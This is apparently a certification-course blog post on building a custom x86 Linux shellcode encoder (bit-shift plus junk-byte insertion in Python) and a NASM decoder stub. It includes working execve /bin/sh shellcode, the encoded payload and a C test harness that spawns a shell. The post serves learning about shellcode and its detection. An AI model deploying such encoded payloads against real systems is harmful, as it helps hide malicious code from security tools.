---
layout: single
title: SLAE Assignment 4 -- Encoder
date: 2019-5-11
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

Assignment 4 is create a custom encoder and decoder for some shellcode. For this excercise, I stuck with a simple `execve` shellcode which will execute `/bin/sh`:
```terminal_session
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

## Encoder Fundamentals

We need to encode the aforementioned shellcode and an easy way to accomplish this is with a higher level language such as python. I haven't really done much python with bytearrays so let's see how it works step by step.

### Working with Python

The first thing we want to do is introduce our pristine shellcode to our python script (note that we are using python3 for this).

```python
execve = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
```

According to this [stackoverflow entry](https://stackoverflow.com/questions/2592764/what-does-a-b-prefix-before-a-python-string-mean), the lower-case `b` in our variable definition makes the string that follows a bytes string literal. What does this mean? Basically, the expression establishes a `byte object` instead of a `Unicode str object` like we're accustomed to. So even though this entity has all of the superficial features or a regular string, it's actually a bytes object. Let's do some comparisons so that we can solidify this difference in our minds.

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
strObject = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print("The byteObject is " + str(len(byteObject)) + " long.")
print("The strObject is " + str(len(strObject)) + " long.")
```

If we run this code, we get the following output:

```terminal_session
root@kali:~# python3 encoder.py
The byteObject is 25 long.
The strObject is 25 long.
```

So they are the same length. Let's iterate a print command over them and see if we notice a difference. 

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
strObject = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

for x in byteObject:
	print(x)
```

Running this prints out our hex encoded segments as their decimal companions! This should make them very easy to work with.

```terminal_session
root@kali:~# python3 encoder.py
49
192
80
104
47
47
115
104
104
47
98
105
110
137
227
80
137
226
83
137
225
176
11
205
128
```

Let's do the same thing for our standard Unicode str object and see what the output is. 

```terminal_session
root@kali:~# python3 encoder.py
1
À
P
h
/
/
s
h
h
/
b
i
n

ã
P

â
S

á
°


Í

```

As you can see (or not!), it's printing our hex encoded segments as their Unicode counterparts, we can't work with this. Hopefully now we have a better grasp on how python is handling our `byte object`.

### Bitwise Operators

According to [tutorialspoint,](https://www.tutorialspoint.com/python/bitwise_operators_example.htm) we can use the following bitwise operators in python:

| Operator                 | Description                                                                                  |
|--------------------------|----------------------------------------------------------------------------------------------|
| & Binary AND             | Operator copies a bit to the result if it exists in both operands.                           |
| \| Binary OR              | It copies a bit if it exists in either operand.                                              |
| ^ Binary XOR             | It copies the bit if it is set in one operand but not both.                                  |
| ~ Binary Ones Complement | It is unary and has the effect of 'flipping' bits.                                           |
| << Binary Left Shift     | The left operands value is moved left by the number of bits specified by the right operand.  |
| >> Binary Right Shift    | The left operands value is moved right by the number of bits specified by the right operand. |

A bitwise operation is when you convert your two operands into their binary representation and then starting from the right (least significant bit) begin to do a logical operation between each binary digit. 

For example, take the operands 12 and 10 and then perform a bitwise `AND` on them to get 8:

`1100` **AND** `1010` = `1000` 

Starting on each number's right and moving left:

`0` **AND** `0` = `0`

`0` **AND** `1` = `0`

`1` **AND** `0` = `0`

`1` **AND** `1` = `1`

For more practice, play with this [calculator](https://www.rapidtables.com/calc/math/binary-calculator.html). 

At this point we know fundamentally how python is working and what a bitwise logical operation entails. We can research the other operators and figure out how they do their operations. Now we can begin encoding our shellcode. 

## Encoder

For our encoder, let's keep things relatively simple. Our encoding process will do the following:
+ if the decimal equivalent of our hex segment is less than `128`, we will shift its bits to the left one slot. As you can probably figure out, if we were to do this with a value of `128` or higher, shifting its bits to the left even one spot would increase its value to a minimum of `256` which breaks our scheme. 
+ lastly, we will inject some random bytes into our code at a known interval so that we can later delete those same bytes since the interval is known. In simpler terms: if I know every other byte is fake, I'll make my decoder delete every other byte. 

### Step 1 -- Bit Shift

In order to mark which bytes we are shifting we will append a `0xff` to them so that later when we decode, we know which ones were shifted. 

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encode = ""

for x in bytearray(byteObject):
	if x < 128:
		x = x << 1
		encode += '\\xff'

	encode += "\\x"
	encode += '%02x'%x
		

print(encode)
```

Output

```terminal_session
root@kali:~# python3 encoder.py
\xff\x62\xc0\xff\xa0\xff\xd0\xff\x5e\xff\x5e\xff\xe6\xff\xd0\xff\xd0\xff\x5e\xff\xc4\xff\xd2\xff\xdc\x89\xe3\xff\xa0\x89\xe2\xff\xa6\x89\xe1\xb0\xff\x16\xcd\x80
```

Looks like we ended up with 14 of the bytes shifted. That's pretty cool!

### Step 2 -- Random Byte Injection

Now we import the `random` module and use it to inject a random byte during each iteration of the loop. In other words, our encoder will now shift bytes lower than `128`, prepend those bytes with `0xff`, and then finally append that byte with a random byte. So in practice we can have the following pseudo bytes sequences:
+ Unshifted + Random
+ 0xff + Shifted + Random

Lastly, we'll want to print to terminal our shellcode formatted in a way that we can use it in our assembly, annotated here as the 'For NASM:' output.

```python
import random

byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encode = ""


for x in bytearray(byteObject):
	if x < 128:
		x = x << 1
		encode += '\\xff'

	encode += "\\x"
	encode += '%02x'% x
	sneaky = random.randint(2,253)
	encode += '\\x%02x' % sneaky

		

db = str(encode).replace("\\x", ",0x")
db = db[1:]
print('For NASM: ' + db)
```

Running this gives us the following output:

```terminal_session
root@kali:~# python3 encoder.py
For NASM: 0xff,0x62,0x0f,0xc0,0xde,0xff,0xa0,0x5a,0xff,0xd0,0x1b,0xff,0x5e,0x09,0xff,0x5e,0xed,0xff,0xe6,0x09,0xff,0xd0,0x93,0xff,0xd0,0x30,0xff,0x5e,0xc8,0xff,0xc4,0x26,0xff,0xd2,0x3e,0xff,0xdc,0xa3,0x89,0x14,0xe3,0x9a,0xff,0xa0,0x47,0x89,0xe0,0xe2,0xa2,0xff,0xa6,0xa5,0x89,0x8b,0xe1,0x9e,0xb0,0x67,0xff,0x16,0x8c,0xcd,0xb2,0x80,0x30
```

## Decoder

I'm not going to lie, figuring out how to decode this took me an entire day. First let's add an `0xaa` to the end of our shellcode so that we can add some control flow to our assembly and have it run the shell-code once we do a `CMP` operation with our current iteration. If we compare our current iteration with `0xaa` and the result is zero, then we know we're done decoding and we can run the shell-code.

Let's jump right into the assembly!

```nasm
global _start


section .text

_start:

	jmp short call_decoder	
	

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	

sniffer:
	mov bl, byte [esi + eax]
	cmp bl, 0xaa
	jz shellcode
	mov bl, byte [esi + eax]
	cmp bl, 0xff
	jz shifter
	mov bl, byte [esi + eax]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short sniffer
	
	
shifter:
	mov bl, byte [esi + eax + 1]
	shr bl, 1
	mov byte [edi], bl
	inc edi
	add al, 3
	jmp short sniffer
	
call_decoder:

	call decoder
	shellcode: db 0xff,0x62,0x0f,0xc0,0xde,0xff,0xa0,0x5a,0xff,0xd0,0x1b,0xff,0x5e,0x09,0xff,0x5e,0xed,0xff,0xe6,0x09,0xff,0xd0,0x93,0xff,0xd0,0x30,0xff,0x5e,0xc8,0xff,0xc4,0x26,0xff,0xd2,0x3e,0xff,0xdc,0xa3,0x89,0x14,0xe3,0x9a,0xff,0xa0,0x47,0x89,0xe0,0xe2,0xa2,0xff,0xa6,0xa5,0x89,0x8b,0xe1,0x9e,0xb0,0x67,0xff,0x16,0x8c,0xcd,0xb2,0x80,0x30,0xaa
```

Let's break this down:
+ the first thing we do with `jmp short call_decoder` is direct control flow to our `call_decoder` function. This function's first instruction is `call decoder`, what this does is store the `shellcode: db` content on the top of the stack and then direct control flow to the `decoder` function. 

```nasm
decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
```

All we're doing is popping the `shellcode: db` off of the top of the stack and into `esi` so `esi` has our shell-code now. We are going to use `edi` to keep track of our decoded shell-code so we `lea` it with the memory location of `esi`. Then we just clear registers.

Let's observe that our first byte in our payload is `0xff` which we know from our encoder means that the byte after it has been switched one place to the right. Let's examine the `sniffer` function to see how it handles this. 

```nasm
sniffer:
	mov bl, byte [esi + eax]	; $eax is 0, so this is just moving the byte at $esi (0xff) into $bl
	cmp bl, 0xaa			; compare $bl with 0xaa, if it's a zero, we're done decoding, send control flow our shell-code
	jz shellcode
	mov bl, byte [esi + eax]	; again, just loading $bl up with the byte at $esi since $eax is zero.
	cmp bl, 0xff			; here, we actually will get a zero because bl is 0xff right now
	jz shifter			; jump on zero to the function shifter
```

Let's see what shifter does. 

```nasm
shifter:
	mov bl, byte [esi + eax + 1]	; we know the byte after 0xff is the one we want, load it into $bl
	shr bl, 1			; we 'shift it right' once, to retrieve its original value
	mov byte [edi], bl		; then we store that value into $edi
	inc edi				; $edi at its original position is full of that value, so lets move to $edi's second position
	add al, 3			; since $esi is on the 0xff, we need to add 3 to $al so we skip 0xff, shifted byte, junk byte
	jmp short sniffer		; start sniffer over
```

To break down the `add al, 3` portion further, we had this structure `0xff,0x62,0x0f,0xc0` at the beginning of our shell-code so once we interrogated the `$esi` + `$eax` position, which was `0xff`, we can now rule out `0x62` and `0x0f` for interrogation because we restored `0x62` to its original value, and we know `0x0f` was a garbage insertion. So now we add 3 to `$eax` so that next time we interrogate the `$esi` + `$eax (3)` we'll be interrogating `0xc0` which is what we want because we have to check if this new unknown byte is `0xaa` or `0xff` and if it's neither, we know it's a good byte to add to `$edi` who is tracking our decoded payload. 

Let's see what happens in the rest of the `sniffer` function when we get to a good byte like `0xc0`. 

```nasm
mov bl, byte [esi + eax]	; since we know its a good byte, move it into $bl
	mov byte [edi], bl	; move it into $edi who's keeping track of our decoded shell-code
	inc edi			; this $edi position has been filled with a good byte, let's move to the next empty one
	add al, 2		; we know the byte after this will be garbage, so we lets skip it
	jmp short sniffer	; start this loop over
```

Let's test it!

```terminal_session
root@kali:~# objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x2e\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x24\x8a\x1c\x06\x80\xfb\xff\x74\x0a\x8a\x1c\x06\x88\x1f\x47\x04\x02\xeb\xe6\x8a\x5c\x06\x01\xd0\xeb\x88\x1f\x47\x04\x03\xeb\xd9\xe8\xcd\xff\xff\xff\xff\x62\x0f\xc0\xde\xff\xa0\x5a\xff\xd0\x1b\xff\x5e\x09\xff\x5e\xed\xff\xe6\x09\xff\xd0\x93\xff\xd0\x30\xff\x5e\xc8\xff\xc4\x26\xff\xd2\x3e\xff\xdc\xa3\x89\x14\xe3\x9a\xff\xa0\x47\x89\xe0\xe2\xa2\xff\xa6\xa5\x89\x8b\xe1\x9e\xb0\x67\xff\x16\x8c\xcd\xb2\x80\x30\xaa"
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2e\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x24\x8a\x1c\x06\x80\xfb\xff\x74\x0a\x8a\x1c\x06\x88\x1f\x47\x04\x02\xeb\xe6\x8a\x5c\x06\x01\xd0\xeb\x88\x1f\x47\x04\x03\xeb\xd9\xe8\xcd\xff\xff\xff\xff\x62\x0f\xc0\xde\xff\xa0\x5a\xff\xd0\x1b\xff\x5e\x09\xff\x5e\xed\xff\xe6\x09\xff\xd0\x93\xff\xd0\x30\xff\x5e\xc8\xff\xc4\x26\xff\xd2\x3e\xff\xdc\xa3\x89\x14\xe3\x9a\xff\xa0\x47\x89\xe0\xe2\xa2\xff\xa6\xa5\x89\x8b\xe1\x9e\xb0\x67\xff\x16\x8c\xcd\xb2\x80\x30\xaa"

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Next we compile it.

```terminal_session
root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o decodeTest
shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main()
 ^~~~
```

Moment of truth, we should get back a `/bin/sh` command shell if this works. 

```terminal_session
root@kali:~# ./decodeTest
Shellcode Length:  119
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux kali 4.17.0-kali1-686 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) i686 GNU/Linux
# 
```

It works!! 14 hours well spent lol. 

## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment4)





